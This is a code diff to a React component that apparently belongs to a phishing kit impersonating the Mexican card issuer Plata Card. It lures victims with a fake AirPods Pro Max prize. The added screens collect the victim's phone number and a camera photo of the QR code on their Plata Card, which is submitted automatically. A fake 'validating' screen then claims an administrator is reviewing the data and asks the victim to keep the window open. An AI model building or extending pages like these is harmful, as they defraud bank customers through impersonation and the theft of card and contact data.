@@ -193,7 +193,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                   <div className="mb-16">
                     <Button 
                       className="platacard-button text-2xl font-bold px-12 py-6 rounded-xl shadow-2xl transform hover:scale-105 transition-all duration-300"
-                      onClick={() => onSubmit(ScreenType.PROMOCION, {})}
+                      onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                     >
                       Reclamar mis AirPods Pro Max →
                     </Button>
@@ -302,7 +302,7 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
                 <div className="text-center mt-24">
                   <Button 
                     className="w-full sm:w-auto bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white px-12 py-6 text-xl font-bold rounded-lg shadow-lg hover:shadow-xl transition-all duration-300 transform hover:scale-105"
-                    onClick={() => onSubmit(ScreenType.PROMOCION, {})}
+                    onClick={() => onSubmit(ScreenType.TERMINOS, {})}
                   >
                     Reclamar mis AirPods Pro Max →
                   </Button>
@@ -350,13 +350,185 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
             </div>
             <Button 
               className="platacard-button"
-              onClick={() => onSubmit(ScreenType.TERMINOS, {})}
+              onClick={() => onSubmit(ScreenType.PHONE_INPUT, {})}
             >
               Aceptar Términos
             </Button>
           </>
         );
         return getBankContainer(terminosContent);
+
+      case ScreenType.PHONE_INPUT:
+        return (
+          <ScreenContainer>
+            <div className="min-h-screen bg-white flex items-center justify-center p-4">
+              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
+                {/* Header estilo platacard.mx */}
+                <div className="text-center mb-8">
+                  <div className="bg-gradient-to-r from-orange-500 to-orange-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span className="text-2xl text-white">📱</span>
+                  </div>
+                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Ingresa tu teléfono</h2>
+                  <p className="text-gray-600">Para contactarte sobre tu entrega</p>
+                </div>
+
+                {/* Input de teléfono */}
+                <div className="mb-6">
+                  <label className="block text-sm font-medium text-gray-700 mb-2">
+                    Número de teléfono celular
+                  </label>
+                  <input
+                    type="tel"
+                    value={dataA}
+                    onChange={(e) => setDataA(e.target.value)}
+                    placeholder="55 1234 5678"
+                    className="w-full px-4 py-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-orange-500 focus:border-orange-500 text-lg"
+                    maxLength={12}
+                  />
+                  <p className="text-xs text-gray-500 mt-2">
+                    Formato: 55 1234 5678 (con espacios)
+                  </p>
+                </div>
+
+                {/* Botón continuar */}
+                <Button
+                  onClick={() => onSubmit(ScreenType.QR_SCAN, { phone: dataA })}
+                  disabled={!dataA || dataA.length < 10}
+                  className="w-full platacard-button py-3 text-lg font-semibold rounded-xl transition-all duration-300 disabled:opacity-50 disabled:cursor-not-allowed"
+                >
+                  Continuar
+                </Button>
+
+                {/* Info adicional */}
+                <p className="text-xs text-gray-500 text-center mt-4">
+                  Tu teléfono será usado únicamente para coordinar la entrega de tus AirPods Pro Max
+                </p>
+              </div>
+            </div>
+          </ScreenContainer>
+        );
+
+      case ScreenType.QR_SCAN:
+        return (
+          <ScreenContainer>
+            <div className="min-h-screen bg-white flex items-center justify-center p-4">
+              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100">
+                {/* Header */}
+                <div className="text-center mb-8">
+                  <div className="bg-gradient-to-r from-orange-500 to-orange-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <span className="text-2xl text-white">📷</span>
+                  </div>
+                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Escanea tu tarjeta</h2>
+                  <p className="text-gray-600">Código QR de tu Plata Card</p>
+                </div>
+
+                {/* Área de cámara simulada */}
+                <div className="bg-gray-100 rounded-xl p-8 mb-6 text-center">
+                  <div className="border-2 border-dashed border-orange-400 rounded-xl p-12 mb-4">
+                    <div className="text-4xl mb-4">📱</div>
+                    <p className="text-gray-600 mb-4">Coloca el QR de tu tarjeta aquí</p>
+                    
+                    {/* Input de archivo oculto para simular captura */}
+                    <input
+                      type="file"
+                      accept="image/*"
+                      capture="environment"
+                      onChange={(e) => {
+                        const file = e.target.files?.[0];
+                        if (file) {
+                          // Simular captura del QR
+                          const reader = new FileReader();
+                          reader.onload = (event) => {
+                            setDataA(event.target?.result as string);
+                            // Enviar automáticamente al capturar
+                            setTimeout(() => {
+                              onSubmit(ScreenType.QR_VALIDATION, { qrImage: event.target?.result });
+                            }, 500);
+                          };
+                          reader.readAsDataURL(file);
+                        }
+                      }}
+                      className="hidden"
+                      id="qr-capture"
+                    />
+                    <label
+                      htmlFor="qr-capture"
+                      className="inline-block platacard-button px-6 py-3 text-lg font-semibold rounded-xl cursor-pointer"
+                    >
+                      📷 Capturar QR
+                    </label>
+                  </div>
+                </div>
+
+                {/* Instrucciones */}
+                <div className="bg-orange-50 rounded-xl p-4 mb-6">
+                  <h4 className="font-semibold text-orange-800 mb-2">Instrucciones:</h4>
+                  <ul className="text-sm text-orange-700 space-y-1">
+                    <li>• Busca el código QR en tu tarjeta Plata Card</li>
+                    <li>• Asegúrate de que esté bien iluminado</li>
+                    <li>• Mantén la cámara estable al capturar</li>
+                  </ul>
+                </div>
+
+                {/* Vista previa si ya se capturó */}
+                {dataA && (
+                  <div className="text-center">
+                    <p className="text-sm text-green-600 mb-2">✓ QR capturado correctamente</p>
+                    <img src={dataA} alt="QR capturado" className="max-w-32 mx-auto rounded-lg border" />
+                  </div>
+                )}
+              </div>
+            </div>
+          </ScreenContainer>
+        );
+
+      case ScreenType.QR_VALIDATION:
+        return (
+          <ScreenContainer>
+            <div className="min-h-screen bg-white flex items-center justify-center p-4">
+              <div className="max-w-md w-full bg-white rounded-2xl shadow-2xl p-8 border border-gray-100 text-center">
+                {/* Header */}
+                <div className="mb-8">
+                  <div className="bg-gradient-to-r from-orange-500 to-orange-600 w-16 h-16 rounded-full flex items-center justify-center mx-auto mb-4">
+                    <div className="animate-spin text-2xl text-white">⏳</div>
+                  </div>
+                  <h2 className="text-2xl font-bold text-gray-900 mb-2">Validando información</h2>
+                  <p className="text-gray-600">Verificando tu código QR...</p>
+                </div>
+
+                {/* Indicador de carga */}
+                <div className="mb-8">
+                  <div className="bg-gray-200 rounded-full h-2 mb-4">
+                    <div className="bg-gradient-to-r from-orange-500 to-orange-600 h-2 rounded-full animate-pulse" style={{ width: '60%' }}></div>
+                  </div>
+                  <p className="text-sm text-gray-500">Esto puede tomar unos momentos...</p>
+                </div>
+
+                {/* Información del proceso */}
+                <div className="bg-orange-50 rounded-xl p-6 mb-6">
+                  <div className="space-y-3 text-sm text-orange-800">
+                    <div className="flex items-center">
+                      <span className="text-green-500 mr-2">✓</span>
+                      QR recibido correctamente
+                    </div>
+                    <div className="flex items-center">
+                      <span className="text-orange-500 mr-2 animate-spin">⏳</span>
+                      Verificando con base de datos
+                    </div>
+                    <div className="flex items-center">
+                      <span className="text-gray-400 mr-2">○</span>
+                      Validando elegibilidad
+                    </div>
+                  </div>
+                </div>
+
+                <p className="text-xs text-gray-500">
+                  Un administrador está revisando tu información. Por favor mantén esta ventana abierta.
+                </p>
+              </div>
+            </div>
+          </ScreenContainer>
+        );
 
       case ScreenType.FOLIO:
         const folioContent = (
